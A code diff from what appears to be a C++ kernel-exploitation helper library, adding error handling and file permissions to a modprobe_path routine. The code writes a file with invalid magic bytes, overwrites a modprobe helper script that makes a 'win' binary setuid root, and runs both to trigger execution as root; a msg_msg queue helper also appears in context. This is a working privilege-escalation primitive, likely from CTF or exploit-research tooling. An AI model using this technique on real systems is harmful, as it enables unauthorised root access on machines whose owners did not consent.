@@ -11,7 +11,7 @@ void pwn::modprobe_path::init(std::string modprobe_path, std::string dummy_file,
 {
     // todo: check if these path are all absolute path
 
-    int fd = open(dummy_file.c_str(), O_RDWR | O_CREAT);
+    int fd = open(dummy_file.c_str(), O_RDWR | O_CREAT, 0660);
     if (fd < 0)
     {
         perror("[*] dummy_file creation failed");
@@ -19,7 +19,12 @@ void pwn::modprobe_path::init(std::string modprobe_path, std::string dummy_file,
     }
 
     char bad_magic[] = "\xff\xff\xff\xff";
-    write(fd, bad_magic, sizeof(bad_magic) - 1); // remove null terminator
+    // remove null terminator
+    if (write(fd, bad_magic, sizeof(bad_magic) - 1) == -1)
+    {
+        spdlog::error("Failed to write bad_magic");
+        exit(-1);
+    }
     close(fd);
 
     std::string w = "#!/bin/sh\nchmod 4755 " + win_bin + " && chown root:root " + win_bin + " && chmod u+s " + win_bin + "\n";
@@ -30,13 +35,16 @@ void pwn::modprobe_path::init(std::string modprobe_path, std::string dummy_file,
         exit(-1);
     };
 
-    fd = open(modprobe_path.c_str(), O_RDWR | O_CREAT);
+    fd = open(modprobe_path.c_str(), O_RDWR | O_CREAT, 0660);
     if (fd < 0)
     {
         spdlog::error("modprobe_path creation failed");
     }
 
-    write(fd, w.c_str(), w.size() + 1);
+    if(write(fd, w.c_str(), w.size() + 1) == -1){
+        spdlog::error("Failed to write to modprobe_path");
+        exit(-1);
+    }
     close(fd);
 
     if (chmod(modprobe_path.c_str(), 0777) < 0)
@@ -48,10 +56,16 @@ void pwn::modprobe_path::init(std::string modprobe_path, std::string dummy_file,
 void pwn::modprobe_path::trigger(std::string dummy_file, std::string win_bin)
 {
     spdlog::info("Triggering modprobe_path");
-    system(dummy_file.c_str());
+    if(system(dummy_file.c_str()) == -1){
+        spdlog::error("Failed to trigger modprobe_path");
+        exit(-1);
+    }
 
     spdlog::info("Triggering win");
-    system(win_bin.c_str());
+    if(system(win_bin.c_str()) == -1){
+        spdlog::error("Failed to trigger win");
+        exit(-1);
+    }
 }
 
 int32_t pwn::msg_msg::make_queue(key_t key, int msgflg)
